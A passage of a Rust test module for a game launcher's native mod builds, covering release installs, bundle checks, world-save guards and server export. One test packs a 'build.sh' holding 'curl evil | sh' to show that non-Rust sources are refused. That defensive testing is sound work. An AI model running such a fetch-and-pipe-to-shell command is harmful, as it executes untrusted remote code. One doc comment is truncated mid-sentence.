    !own.iter()
        .any(|n| named(n) || named(&format!("{n}{}", std::env::consts::EXE_SUFFIX)))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::process::{Command, Stdio};

    #[test]
    fn the_window_says_build_steps_in_player_words() {
        let rust = Step::Rust(0.42).shown();
        assert!(!rust.contains("Rust") && !rust.contains('%'), "{rust}");
        assert!(!Step::Tool.shown().contains("mixins"));
        assert!(!Step::Mixins.shown().contains("mixins"));
        // A step already in plain words reads the same in both.
        let done = Step::Done {
            secs: 41,
            profile: Profile::Optimized,
            plan: Plan::Prebuilt,
        };
        assert_eq!(done.shown(), done.label());
    }

    /// The player's route, from a fresh data folder with nothing registered by hand: the
    /// launcher's own install of a release, a native build on it, then an update to a newer
    /// release and a switch to it. The native build reads its base's resources throughout.
    #[test]
    fn a_native_build_starts_from_a_release_the_launcher_installed() {
        use std::io::Write;
        use std::net::TcpListener;
        if std::env::var_os("SUNRISE_PLAYER_FLOW_CHILD").is_none() {
            let home = tempfile::tempdir().unwrap();
            let status = Command::new(std::env::current_exe().unwrap())
                .args([
                    "--exact",
                    "native_mods::tests::a_native_build_starts_from_a_release_the_launcher_installed",
                ])
                .env("SUNRISE_PLAYER_FLOW_CHILD", "1")
                .env("SUNRISE_LAUNCHER_HOME", home.path().join("launcher"))
                .env("SUNRISE_HOME", home.path().join("home"))
                .env("XDG_DATA_HOME", home.path().join("data"))
                .env("XDG_CONFIG_HOME", home.path().join("config"))
                .env("SUNRISE_LAUNCHER_NO_SELF_UPDATE", "1")
                .status()
                .unwrap();
            assert!(status.success());
            return;
        }
        // A release archive as GitHub serves it: one top folder holding the game.
        let mut archive = Vec::new();
        {
            let mut tar = tar::Builder::new(flate2::write::GzEncoder::new(
                &mut archive,
                flate2::Compression::fast(),
            ));
            let game = b"release game";
            let mut header = tar::Header::new_gnu();
            header.set_size(game.len() as u64);
            header.set_mode(0o755);
            header.set_cksum();
            tar.append_data(
                &mut header,
                format!("sunrise-linux-x86_64/{}", backend::CLIENT),
                &game[..],
            )
            .unwrap();
            tar.into_inner().unwrap().finish().unwrap();
        }
        let sha256: String =
            sha2::Digest::finalize(<sha2::Sha256 as sha2::Digest>::new_with_prefix(&archive))
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect();
        let install_release = |tag: &str| {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let url = format!(
                "http://{}/sunrise-linux-x86_64.tar.gz",
                listener.local_addr().unwrap()
            );
            let body = archive.clone();
            let server = std::thread::spawn(move || {
                let (mut stream, _) = listener.accept().unwrap();
                let mut request = [0; 4096];
                let _ = std::io::Read::read(&mut stream, &mut request);
                write!(
                    stream,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                )
                .unwrap();
                stream.write_all(&body).unwrap();
            });
            let release = backend::Release {
                tag: tag.into(),
                name: tag.into(),
                body: String::new(),
                date: String::new(),
                time: String::new(),
                asset: Some((url, archive.len() as u64)),
                prerelease: false,
                nightly: None,
            };
            backend::install_as(&release, tag, &sha256, None, |_| {}).unwrap();
            server.join().unwrap();
            // `sunrise-launcher prepare` writes the resources from the player's own Minecraft.
            let resources = backend::resources(tag);
            fs::create_dir_all(&resources).unwrap();
            fs::write(resources.join("sunrise-resources.json"), b"{}").unwrap();
        };
        let (old, new) = ("v2026.11.01", "v2026.11.02");
        // (a) A fresh install: the release is the build's base, chosen as the launcher chooses.
        install_release(old);
        let base = base_for(None, &backend::installed(), false).unwrap();
        assert_eq!(base, old);
        let binary = dir("player-flow").join("built");
        fs::write(&binary, b"native game").unwrap();
        let native = "native-player-flow";
        install(
            &base,
            native,
            Target::Client,
            &binary,
            &[],
            &serde_json::json!({"base": base, "sunrise": "0".repeat(40), "target": "client"}),
            &[],
        )
        .unwrap();
        backend::need_prepared(native).unwrap();
        assert_eq!(backend::resources(native), backend::resources(old));
        // (b) An update: a newer release arrives, and a rebuild with `update` moves to it. The
        // build made before it still plays, on the base it was made from, which stays installed.
        install_release(new);
        assert_eq!(
            base_for(Some(native), &backend::installed(), true).as_deref(),
            Some(new)
        );
        assert_eq!(
            update_for(native, &backend::installed()).as_deref(),
            Some(new)
        );
        backend::need_prepared(native).unwrap();
        assert!(backend::remove_version(old).unwrap_err().contains(native));
        // (c) Switching the selected version leaves the build and its base as they are.
        let mut settings = backend::Settings::load();
        settings.selected = Some(new.into());
        settings.save().unwrap();
        backend::need_prepared(native).unwrap();
        assert_eq!(backend::resources(native), backend::resources(old));
    }

    #[test]
    fn isolation_keeps_cancellation_exact_after_a_retry() {
        let _guard = scratch_state();
        let mut attempts = 0;
        let result = isolated(
            |skip| {
                attempts += 1;
                if skip.is_empty() {
                    return Err(Failed::Mods {
                        left: vec![LeftOut {
                            id: "broken".into(),
                            version: "1.0.0".into(),
                            why: isolate::Why::OtherVersion,
                        }],
                        error: "compiler failure".into(),
                        compiling: true,
                    });
                }
                assert_eq!(skip[0].id, "broken");
                Err(Failed::Other(CANCELLED.into()))
            },
            &|_| {},
        );
        assert_eq!(String::from(result.unwrap_err()), CANCELLED);
        assert_eq!(attempts, 2);
    }

    #[test]
    fn a_mod_saved_into_a_world_is_never_switched_off_without_the_players_choice() {
        use sunrise_launcher_nbt::{self as nbt, Limits, Tag};
        let _guard = scratch_state();
        let home = dir("guard-worlds");
        let world = home.join("saves").join("Home");
        fs::create_dir_all(&world).unwrap();
        let record = Tag::compound([
            ("ModId", Tag::String("greeter".into())),
            ("ModVersion", Tag::String("1.0.0".into())),
        ]);
        let root = Tag::compound([
            (
                "Data",
                Tag::compound([("LevelName", Tag::String("Home".into()))]),
            ),
            (
                "fml",
                Tag::compound([("LoadingModList", Tag::List(vec![record]))]),
            ),
        ]);
        let bytes = nbt::write_named(
            &nbt::NamedTag {
                name: "".into(),
                tag: root,
            },
            Limits::default(),
        )
        .unwrap();
        fs::write(world.join("level.dat"), bytes).unwrap();
        let left = |why| LeftOut {
            id: "greeter".into(),
            version: "1.0.0".into(),
            why,
        };
        let build = "nightly-2026-11-20 (9a8b7c6)";
        // A mod that fit but didn't compile goes through the same rule as one that doesn't fit.
        for (why, headline, unbuilt) in [
            (
                isolate::Why::DidNotBuild,
                "greeter looked compatible with nightly-2026-11-20 (9a8b7c6) but didn't build.",
                vec!["greeter".to_owned()],
            ),
            (
                isolate::Why::Unfit("why".into()),
                "greeter doesn't fit nightly-2026-11-20 (9a8b7c6).",
                vec![],
            ),
        ] {
            let stopped = guard_worlds(&home, &[left(why)], build, false, &|_| {});
            let Err(Failed::Worlds(stake)) = stopped else {
                panic!("a world saved with the mod must stop the build");
            };
            assert!(stake.text.starts_with(headline), "{}", stake.text);
            assert_eq!(stake.worlds, ["Home"]);
            assert_eq!(stake.mods, ["greeter"]);
            assert_eq!(stake.unbuilt, unbuilt);
            assert_eq!(stake.backups, home.join("backups"));
            assert!(
                !home.join("backups").exists(),
                "nothing is backed up unasked"
            );
        }
        // A mod that failed to compile but is in no world isn't part of the stop.
        let Err(Failed::Worlds(stake)) = guard_worlds(
            &home,
            &[left(isolate::Why::DidNotBuild), {
                let mut other = left(isolate::Why::DidNotBuild);
                other.id = "elsewhere".into();
                other
            }],
            build,
            false,
            &|_| {},
        ) else {
            panic!("a world saved with the mod must stop the build");
        };
        assert_eq!(stake.mods, ["greeter"]);
        assert_eq!(stake.unbuilt, ["greeter"]);
        // Chosen: the world is backed up first, then the build may go on without the mod.
        let said = std::cell::RefCell::new(Vec::new());
        guard_worlds(
            &home,
            &[left(isolate::Why::DidNotBuild)],
            build,
            true,
            &|step| said.borrow_mut().push(step),
        )
        .unwrap();
        assert_eq!(fs::read_dir(home.join("backups")).unwrap().count(), 1);
        assert!(matches!(said.borrow().as_slice(), [Step::BackedUp(_)]));
        // A mod no world was saved with is switched off with no question.
        let other = LeftOut {
            id: "other".into(),
            version: "1.0.0".into(),
            why: isolate::Why::DidNotBuild,
        };
        assert!(guard_worlds(&home, &[other], build, false, &|_| {}).is_ok());
        fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn isolation_bounds_recompiles_and_keeps_the_failure() {
        let _guard = scratch_state();
        let mut attempts = 0;
        let result = isolated(
            |skip| {
                attempts += 1;
                assert_eq!(skip.len(), attempts - 1);
                Err(Failed::Mods {
                    left: vec![LeftOut {
                        id: format!("broken_{attempts}"),
                        version: "1.0.0".into(),
                        why: isolate::Why::OtherVersion,
                    }],
                    error: "compiler failure".into(),
                    compiling: true,
                })
            },
            &|_| {},
        );
        let error = String::from(result.unwrap_err());
        assert_eq!(attempts, COMPILE_RETRIES + 1);
        assert!(error.contains("broken_1 was left out"), "{error}");
        assert!(error.ends_with("compiler failure"), "{error}");
    }

    #[test]
    fn pe_machine_reads_the_architecture_after_validating_both_headers() {
        let dir = dir("pe-machine");
        let executable = dir.join("game.exe");
        let mut image = vec![0; 70];
        image[..2].copy_from_slice(b"MZ");
        image[0x3c..0x40].copy_from_slice(&64_u32.to_le_bytes());
        image[64..68].copy_from_slice(b"PE\0\0");
        image[68..70].copy_from_slice(&rust_toolchain::WINDOWS_ARM64_MACHINE.to_le_bytes());
        fs::write(&executable, &image).unwrap();
        assert_eq!(pe_machine(&executable).unwrap(), 0xaa64);

        image[64] = b'X';
        fs::write(&executable, image).unwrap();
        assert!(pe_machine(&executable)
            .unwrap_err()
            .contains("missing PE signature"));
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn windows_build_platform_follows_the_selected_games_pe_machine() {
        let x64 = windows_build_platform(
            rust_toolchain::WINDOWS_X64_MACHINE,
            rust_toolchain::WINDOWS_X64_TARGET,
        )
        .unwrap();
        assert_eq!(x64.target, Some(rust_toolchain::WINDOWS_X64_TARGET));
        assert_eq!(x64.machine, Some(rust_toolchain::WINDOWS_X64_MACHINE));
        assert_eq!(x64.cache_key(), Some("windows-x64-gnu-runtime-v1"));

        let arm64 = windows_build_platform(
            rust_toolchain::WINDOWS_ARM64_MACHINE,
            rust_toolchain::WINDOWS_ARM64_TARGET,
        )
        .unwrap();
        assert_eq!(arm64.target, Some(rust_toolchain::WINDOWS_ARM64_TARGET));
        assert_eq!(arm64.machine, Some(rust_toolchain::WINDOWS_ARM64_MACHINE));
        assert_eq!(
            arm64.cache_key(),
            Some(rust_toolchain::WINDOWS_ARM64_TARGET)
        );

        assert!(windows_build_platform(
            rust_toolchain::WINDOWS_X64_MACHINE,
            rust_toolchain::WINDOWS_ARM64_TARGET,
        )
        .is_err());
        assert!(windows_build_platform(
            rust_toolchain::WINDOWS_ARM64_MACHINE,
            rust_toolchain::WINDOWS_X64_TARGET,
        )
        .is_err());
        assert!(windows_build_platform(0xa641, rust_toolchain::WINDOWS_ARM64_TARGET).is_err());
    }

    #[test]
    fn client_runtime_reuses_base_resources_but_server_exports_remain_standalone() {
        let source = dir("resource-base");
        let client = dir("resource-client");
        let server = dir("resource-server");
        fs::create_dir_all(source.join(".local/sunrise-client/26.3")).unwrap();
        fs::write(source.join(".local/sunrise-client/26.3/data"), b"prepared").unwrap();
        fs::write(source.join("sunrise-ctl"), b"control").unwrap();
        copy_base(&source, &client, Target::Client, true).unwrap();
        copy_base(&source, &server, Target::Server, false).unwrap();
        assert!(!client.join(".local").exists());
        assert_eq!(fs::read(client.join("sunrise-ctl")).unwrap(), b"control");
        assert_eq!(
            fs::read(server.join(".local/sunrise-client/26.3/data")).unwrap(),
            b"prepared"
        );
        for path in [source, client, server] {
            fs::remove_dir_all(path).unwrap();
        }
    }

    #[test]
    fn a_rebuild_excludes_the_engine_and_unsupported_build_artifacts() {
        use std::ffi::OsStr;
        for own in [
            backend::CLIENT,
            ".installed",
            "native-mods.json",
            "native-data",
        ] {
            assert!(!carried_over(OsStr::new(own), Target::Client), "{own}");
        }
        for kept in ["sunrise-ctl", "resources", "LICENSE"] {
            assert!(carried_over(OsStr::new(kept), Target::Client), "{kept}");
        }
        // A server build keeps neither the game's own binary nor a stale `sunrise-engine` the
        // base shipped, which would run unmodded beside the built one.
        let engine = Target::Server.binary();
        assert!(
            !carried_over(OsStr::new(&engine), Target::Server),
            "{engine}"
        );
        assert!(!carried_over(OsStr::new(backend::CLIENT), Target::Server));
        assert!(carried_over(OsStr::new("resources"), Target::Server));
    }

    /// Takes the shared test lock after checking that settings, build log and builds resolve
    /// under the lib tests' scratch home, never a real install (no env changes: they race). A
    /// home the developer set with `SUNRISE_LAUNCHER_HOME` / `SUNRISE_HOME` is theirs to choose.
    pub(super) fn scratch_state() -> std::sync::MutexGuard<'static, ()> {
        let scratch = crate::data_location::test_home();
        let set = |name| std::env::var_os(name).is_some();
        if !set("SUNRISE_LAUNCHER_HOME") {
            assert!(
                backend::data_dir().starts_with(&scratch),
                "settings outside the scratch home"
            );
            assert!(
                backend::build_dir().starts_with(&scratch),
                "builds outside the scratch home"
            );
        }
        if !set("SUNRISE_HOME") {
            assert!(
                backend::game_home().starts_with(&scratch),
                "game outside the scratch home"
            );
        }
        TEST_STATE.lock().unwrap_or_else(|e| e.into_inner())
    }

    pub(super) fn dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("sunrise-native-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    fn project_manifest(id: &str, version: &str, sunrise: &str, mixins: &str) -> String {
        format!(
            "id='{id}'\nname='{id}'\nversion='{version}'\napi='0.2'\ncapabilities=['registries']\n[native]\ngame='26.3'\nsunrise='{sunrise}'\nmixins='{mixins}'\n"
        )
    }

    pub(super) fn write_bundle(project: &Path, id: &str, helper: &str) {
        fs::create_dir_all(project.join("src")).unwrap();
        fs::write(
            project.join(NATIVE_MANIFEST),
            project_manifest(id, "0.1.0", A, B),
        )
        .unwrap();
        fs::write(
            project.join("Cargo.toml"),
            "[package]\nname='example'\nversion='9.0.0'\n[dependencies]\nsunrise-client='0.1'\n",
        )
        .unwrap();
        fs::write(project.join("src/lib.rs"), helper).unwrap();
    }

    #[test]
    fn retired_native_fields_are_refused_before_bundle_projection() {
        let root = dir("retired-native-fields");
        write_bundle(&root, "alpha", "");
        for field in ["injection", "internals"] {
            fs::write(
                root.join(NATIVE_MANIFEST),
                project_manifest("alpha", "1", A, B) + &format!("[[native.{field}]]\n"),
            )
            .unwrap();
            let error = bundles(&root).unwrap_err();
            assert!(error.contains("unknown field"), "{error}");
            assert!(error.contains(field), "{error}");
        }
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_folder_is_one_bundle_or_a_folder_of_them() {
        let one = dir("one");
        write_bundle(&one, "hello", "fn hook() {}");
        let found = bundles(&one).unwrap();
        assert_eq!(
            (
                found[0].manifest.id.as_str(),
                found[0].manifest.version.as_str()
            ),
            ("hello", "0.1.0")
        );
        let many = dir("many");
        write_bundle(&many.join("b"), "beta", "fn hook() {}");
        write_bundle(&many.join("a"), "alpha", "fn hook() {}");
        fs::create_dir_all(many.join("notes")).unwrap();
        let ids: Vec<String> = bundles(&many)
            .unwrap()
            .into_iter()
            .map(|b| b.manifest.id)
            .collect();
        assert_eq!(ids, ["alpha", "beta"]);
        assert!(bundles(&many.join("notes")).is_err());
    }

    const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    fn write_native(at: &Path, id: &str, sunrise: &str, mixins: &str) {
        write_bundle(at, id, "pub fn marker() {}\n");
        fs::write(
            at.join(NATIVE_MANIFEST),
            project_manifest(id, "0.3.0", sunrise, mixins),
        )
        .unwrap();
    }

    #[test]
    fn native_mods_for_another_game_revision_are_rejected() {
        let root = dir("revision-mismatch");
        write_native(&root.join("matching"), "matching", A, B);
        write_native(&root.join("other"), "other", B, B);
        let mods = bundles(&root).unwrap();
        assert_eq!(
            mismatch(&mods, A).as_deref(),
            Some("other → bbbbbbb; the build uses aaaaaaa")
        );
        assert!(mismatch(&mods[..1], A).is_none());
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_registry_download_is_a_bundle_with_its_pins() {
        let d = dir("smod");
        write_native(&d.join("veinminer"), "veinminer", A, B);
        write_bundle(&d.join("local"), "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        assert_eq!(found.len(), 2);
        assert_eq!(found[1].manifest.id, "veinminer");
        assert_eq!(found[1].dir, d.join("veinminer"));
        assert_eq!(found[1].native().sunrise, A);
        assert_eq!(found[1].native().mixins, B);
        assert_eq!(found[0].native().sunrise, A);
    }

    #[test]
    fn flat_projects_use_manifest_identity_and_reject_old_roots() {
        let root = dir("project-layout");
        write_native(&root, "example", A, B);
        assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.id, "example");
        // Cargo's different name/version do not change mod identity.
        assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.version, "0.3.0");
        fs::write(
            root.join(NATIVE_MANIFEST),
            project_manifest("../escape", "1", A, B),
        )
        .unwrap();
        assert!(bundle_in(&root).is_err());
        fs::write(
            root.join(NATIVE_MANIFEST),
            project_manifest("example", "1", A, B),
        )
        .unwrap();
        for old in [
            "sunrise-native.json",
            "horizon-mixin.toml",
            "native",
            "rust",
        ] {
            fs::write(root.join(old), "").unwrap();
            assert!(bundle_in(&root).is_err(), "{old}");
            fs::remove_file(root.join(old)).unwrap();
        }
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn installed_mods_are_the_checked_files_of_those_turned_on() {
        let d = dir("installed-src");
        write_native(&d, "veinminer", A, B);
        let home = dir("installed-home");
        fs::create_dir_all(home.join(INSTALLED)).unwrap();
        let pack = |name: &str, extra: Option<(&str, &str)>| {
            let mut zip =
                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
            let options = zip::write::SimpleFileOptions::default();
            for file in [NATIVE_MANIFEST, "Cargo.toml", "src/lib.rs"] {
                zip.start_file(file, options).unwrap();
                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
            }
            if let Some((file, body)) = extra {
                zip.start_file(file, options).unwrap();
                zip.write_all(body.as_bytes()).unwrap();
            }
            zip.finish().unwrap();
        };
        pack("veinminer.smod", None);
        assert!(installed_mods(&home).is_err(), "off until turned on");
        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
        let out = installed_mods(&home).unwrap();
        let found = bundles(&out).unwrap();
        assert_eq!(
            fs::read(found[0].dir.join("src/lib.rs")).unwrap(),
            b"pub fn marker() {}\n"
        );
        assert_eq!(
            (
                found[0].manifest.id.as_str(),
                found[0].native().sunrise.as_str()
            ),
            ("veinminer", A)
        );
        // What a build records of it is what the Mods page compares: up to date, not Needs rebuild.
        assert_eq!(
            crate::native_status::enabled(&home),
            [(
                "veinminer".to_string(),
                "0.3.0".to_string(),
                source_digest(&found[0])
            )]
        );
        pack("veinminer.smod", Some(("data/veinminer/table.bin", "data")));
        let out = installed_mods(&home).unwrap();
        let path = out.join("veinminer/data/veinminer/table.bin");
        assert_eq!(fs::read(&path).unwrap(), b"data");
        let first = version_for(
            A,
            B,
            Profile::Optimized,
            Target::Client,
            None,
            &bundles(&out).unwrap(),
        )
        .unwrap();
        fs::write(path, b"changed").unwrap();
        assert_ne!(
            first,
            version_for(
                A,
                B,
                Profile::Optimized,
                Target::Client,
                None,
                &bundles(&out).unwrap()
            )
            .unwrap()
        );
        pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
    }

    /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
    /// The commit-date cache (`dates.json`) is asked once per revision and kept for later
    /// builds.
    #[test]
    fn a_commit_date_is_asked_once_and_kept() {
        let d = dir("commit-dates");
        let file = d.join(DATES);
        let ask = |_: &str, r: &str| -> Result<String, String> { Ok(format!("date of {r}")) };
        assert_eq!(
            remembered(&file, "acme/x", A, ask).unwrap(),
            format!("date of {A}")
        );
        let offline = |_: &str, _: &str| -> Result<String, String> { Err("offline".into()) };
        assert_eq!(
            remembered(&file, "acme/x", A, offline).unwrap(),
            format!("date of {A}")
        );
        // Another repo or revision isn't known yet.
        assert!(remembered(&file, "acme/y", A, offline).is_err());
        assert!(remembered(&file, "acme/x", B, offline).is_err());
        // A broken file is asked again and rewritten.
        fs::write(&file, "not json").unwrap();
        assert_eq!(
            remembered(&file, "acme/x", B, ask).unwrap(),
            format!("date of {B}")
        );
        assert_eq!(
            remembered(&file, "acme/x", B, offline).unwrap(),
            format!("date of {B}")
        );
    }

    #[test]
    fn unknown_manifest_fields_are_refused_by_the_typed_reader() {
        let d = dir("unknown-field");
        write_native(&d, "zoom", A, B);
        let text = fs::read_to_string(d.join(NATIVE_MANIFEST)).unwrap();
        for (name, value) in [("hooks", "1"), ("banana", "\"x\"")] {
            fs::write(
                d.join(NATIVE_MANIFEST),
                format!("{text}\n{name} = {value}\n"),
            )
            .unwrap();
            let error = bundles(&d).unwrap_err();
            assert!(error.contains("unknown field"), "{error}");
            assert!(error.contains(name), "{error}");
        }
    }

    #[test]
    fn the_key_covers_a_bundles_crate_and_data_files() {
        let d = dir("crate-key");
        write_bundle(&d, "crate_demo", "fn hook() {}\n");
        fs::write(d.join("src/salt.rs"), "pub const SALT: u32 = 42;\n").unwrap();
        fs::create_dir_all(d.join("data/crate_demo")).unwrap();
        fs::write(d.join("data/crate_demo/greeting.txt"), "hello").unwrap();
        fs::write(d.join("Cargo.lock"), format!("version=4\n[[package]]\nname='itoa'\nversion='0.4.8'\nsource='registry+https://github.com/rust-lang/crates.io-index'\nchecksum='{}'\n", "a".repeat(64))).unwrap();
        let key = || {
            version_for(
                A,
                B,
                Profile::Optimized,
                Target::Client,
                None,
                &bundles(&d).unwrap(),
            )
            .unwrap()
        };
        let mut seen = vec![key()];
        // This package's pre-source-only build must not be reused with its staged data.
        assert_ne!(seen[0], "native-aaaaaaa-2596136aef15");
        for file in [
            "src/lib.rs",
            "src/salt.rs",
            "Cargo.toml",
            "Cargo.lock",
            "data/crate_demo/greeting.txt",
        ] {
            let mut bytes = fs::read(d.join(file)).unwrap();
            if file == "Cargo.lock" {
                bytes = String::from_utf8(bytes)
                    .unwrap()
                    .replace(&"a".repeat(64), &"b".repeat(64))
                    .into_bytes();
            } else {
                bytes.extend_from_slice(b"\n");
            }
            fs::write(d.join(file), bytes).unwrap();
            let now = key();
            assert!(!seen.contains(&now), "{file} is in the key");
            seen.push(now);
        }
    }

    #[test]
    fn a_native_build_without_a_record_is_refused_before_preparation() {
        let _guard = scratch_state();
        let lease = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
        let Err(error) = pipeline(
            &lease,
            "native-missing-record-test",
            Path::new("missing-mod-folder"),
            Profile::Optimized,
            Target::Client,
            BuildOptions::default(),
            &|_| panic!("invalid records must not start a build"),
        )
        .map_err(String::from) else {
            panic!("invalid build must be refused");
        };
        assert!(error.contains("native-mods.json record"), "{error}");
        assert!(error.contains("Rebuild it"), "{error}");
    }

    /// A record (`native-mods.json`) must name its target ([`about`]).
    #[test]
    fn a_builds_record_requires_a_valid_target() {
        let d = dir("about-target");
        let record = |target: Option<&str>| {
            let json = match target {
                Some(target) => {
                    format!(r#"{{"base":"v2026.10.13","sunrise":"{A}","target":"{target}"}}"#)
                }
                None => format!(r#"{{"base":"v2026.10.13","sunrise":"{A}"}}"#),
            };
            fs::write(d.join("native-mods.json"), json).unwrap();
            about_in(&d)
        };
        assert_eq!(record(None), None);
        assert_eq!(record(Some("client")).unwrap().target, Target::Client);
        assert_eq!(record(Some("server")).unwrap().target, Target::Server);
        assert_eq!(record(Some("anything-else")), None);
        assert_eq!(record(Some("client")).unwrap().sunrise, A);
    }

    /// The export ([`build_server`]): a standalone runtime folder with the engine, resources
    /// and the build's record, engine still executable, and nothing of the player's
    /// overwritten.
    #[test]
    fn an_exported_server_folder_keeps_its_files_and_overwrites_nothing() {
        let built = dir("export-built");
        fs::write(built.join(Target::Server.binary()), b"engine").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(
                built.join(Target::Server.binary()),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        fs::create_dir_all(built.join("resources/data/bake")).unwrap();
        fs::write(built.join("resources/data/bake/table.json"), b"{}").unwrap();
        fs::create_dir_all(built.join("resources")).unwrap();
        fs::write(built.join("resources/lang.json"), b"{}").unwrap();
        let out = dir("export-out");
        let output = out.join("server");
        export(&built, &output).unwrap();
        assert_eq!(
            fs::read(output.join(Target::Server.binary())).unwrap(),
            b"engine"
        );
        assert_eq!(
            fs::read(output.join("resources/data/bake/table.json")).unwrap(),
            b"{}"
        );
        assert_eq!(fs::read(output.join("resources/lang.json")).unwrap(), b"{}");
        assert_eq!(
            fs::read_dir(&out).unwrap().flatten().count(),
            1,
            "no staging folder left beside it"
        );
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(output.join(Target::Server.binary()))
                .unwrap()
                .permissions()
                .mode();
            assert_eq!(mode & 0o111, 0o111, "the engine stays executable");
        }
        // A folder already there is refused, and its contents are left alone.
        let taken = dir("export-taken");
        fs::write(taken.join("keep.txt"), b"mine").unwrap();
        let err = export(&built, &taken).unwrap_err();
        assert!(err.contains("already exists"), "{err}");
        assert_eq!(fs::read(taken.join("keep.txt")).unwrap(), b"mine");
        let failed = out.join("failed");
        assert!(export(&out.join("missing-source"), &failed).is_err());
        assert!(!failed.exists());
        assert_eq!(fs::read_dir(&out).unwrap().flatten().count(), 1);
    }

    #[test]
    fn server_install_is_not_playable_and_export_survives_cache_removal() {
        if std::env::var_os("SUNRISE_SERVER_EXPORT_TEST_CHILD").as_deref()
            != Some(std::ffi::OsStr::new("1"))
        {
            // Environment overrides belong to this exact-test process only;
            // unrelated libtest threads must never see a temporary cache root.
            let home = tempfile::tempdir().unwrap();
            let temporary = home.path().join("tmp");
            fs::create_dir(&temporary).unwrap();
            let mut command = Command::new(std::env::current_exe().unwrap());
            command
                .args([
                    "--exact",
                    "native_mods::tests::server_install_is_not_playable_and_export_survives_cache_removal",
                    "--nocapture",
                ])
                .env("SUNRISE_SERVER_EXPORT_TEST_CHILD", "1")
                .env("SUNRISE_LAUNCHER_NO_SELF_UPDATE", "1")
                .env("SUNRISE_NO_AUDIO", "1")
                .env("RUST_BACKTRACE", "0")
                .env("TMPDIR", &temporary)
                .env("TMP", &temporary)
                .env("TEMP", &temporary)
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());
            for (variable, directory) in [
                ("SUNRISE_LAUNCHER_HOME", "launcher"),
                ("SUNRISE_HOME", "home"),
                ("XDG_DATA_HOME", "data"),
                ("XDG_CONFIG_HOME", "config"),
                ("XDG_CACHE_HOME", "cache"),
                ("SUNRISE_LAUNCHER_TRASH", "trash"),
                ("SUNRISE_LAUNCHER_CLIPBOARD", "clipboard"),
                ("SUNRISE_LAUNCHER_DESKTOP", "desktop"),
            ] {
                command.env(variable, home.path().join(directory));
            }
            // wait_with_output consumes the child, waits and closes its pipes
            // before any removal of the private home. Never replay raw stderr.
            let output = command
                .spawn()
                .expect("operation=spawn path_class=test_binary")
                .wait_with_output()
                .expect("operation=wait path_class=test_binary");
            let stderr = String::from_utf8_lossy(&output.stderr);
            let step = stderr
                .lines()
                .filter_map(|line| line.strip_prefix("NATIVE_SERVER_EXPORT_STEP="))
                .rfind(|step| {
                    [
                        "prepare_base",
                        "prepare_package",
                        "install",
                        "discoverability",
                        "export",
                        "remove_cache",
                        "verify_export",
                        "remove_project",
                        "verify_package",
                        "load_runtime",
                        "verify_runtime",
                        "cleanup",
                    ]
                    .contains(step)
                })
                .unwrap_or("not_started");
            let diagnostic = [
                ("install", "NATIVE_SERVER_EXPORT_INSTALL_OS="),
                ("remove", "NATIVE_SERVER_EXPORT_REMOVE_OS="),
            ]
            .into_iter()
            .find_map(|(operation, prefix)| {
                stderr.lines().find_map(|line| {
                    line.strip_prefix(prefix)?
                        .parse::<i32>()
                        .ok()
                        .map(|code| (operation, code))
                })
            })
            .unwrap_or(("isolated_test", 0));
            let assertion = stderr.lines().any(|line| {
                line.starts_with("assertion failed:") || line.starts_with("assertion `")
            });
            let error_class = match diagnostic.0 {
                "install" => "install_error",
                "remove" => "remove_error",
                _ if assertion => "assertion",
                _ => "other",
            };
            let completion = b"NATIVE_SERVER_EXPORT_COMPLETE";
            let completed = output
                .stdout
                .windows(completion.len())
                .filter(|window| *window == completion)
                .count()
                == 1;
            let status = output.status;
            assert!(
                status.success() && completed,
                "step={step} exit_status={status} completed={completed} error_class={error_class} operation={} path_class=server_cache os_error={}",
                diagnostic.0,
                diagnostic.1
            );
            drop(stderr);
            drop(output);
            home.close().unwrap_or_else(|error| {
                panic!(
                    "step=remove_private_home exit_status={status} error_class=remove_error operation=remove path_class=private_home os_error={:?}",
                    error.raw_os_error()
                )
            });
            return;
        }
        eprintln!("NATIVE_SERVER_EXPORT_STEP=prepare_base");
        let base = "native-test-server-base";
        let version = "native-test-server-cache";
        let source = backend::version_dir(base);
        fs::create_dir_all(source.join(".local/sunrise-client/26.3")).unwrap();
        fs::write(
            source.join(".local/sunrise-client/26.3/facts.json"),
            b"facts",
        )
        .unwrap();
        fs::write(source.join(Target::Server.binary()), b"unmodded").unwrap();
        let native_dir = sunrise_launcher_smod::mod_list::NATIVE_DIR;
        fs::create_dir_all(source.join(native_dir).join("stale")).unwrap();
        eprintln!("NATIVE_SERVER_EXPORT_STEP=prepare_package");
        let project = dir("server-runtime-project");
        write_bundle(&project, "exported", "pub fn hook() {}");
        for (path, bytes) in [
            ("assets/exported/probe.txt", "asset"),
            ("data/exported/native/probe.json", "{}"),
